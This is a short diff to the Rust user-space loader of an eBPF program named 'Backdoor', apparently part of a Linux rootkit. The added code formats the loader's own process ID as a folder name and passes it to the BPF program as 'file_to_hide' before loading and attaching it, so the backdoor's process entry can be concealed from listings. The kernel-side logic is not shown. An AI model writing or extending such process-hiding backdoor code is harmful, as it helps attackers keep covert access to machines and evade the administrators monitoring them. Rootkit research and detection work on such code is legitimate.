@@ -1,4 +1,5 @@
 use std::time::Duration;
+use std::process;
 
 use plain::Plain;
 use libbpf_rs::{
@@ -70,7 +71,16 @@ fn main() -> Result<(),Error>  {
     let skel_builder = BackdoorSkelBuilder::default();
 
 
-    let open_skel = skel_builder.open()?;
+    let mut open_skel = skel_builder.open()?;
+
+    let target_folder = format!("{}",process::id());
+
+    //println!("{}",target_folder);
+
+    open_skel.rodata().target_ppid = 0;
+
+    open_skel.rodata().file_to_hide_len = target_folder.as_bytes().len() as i32;
+    open_skel.rodata().file_to_hide[..target_folder.as_bytes().len()].copy_from_slice(target_folder.as_bytes());
 
     // Begin tracing
     let mut skel = open_skel.load()?;
@@ -86,7 +96,6 @@ fn main() -> Result<(),Error>  {
             panic!("{}",e)
         }
     }
-
 
     skel.attach()?;
 
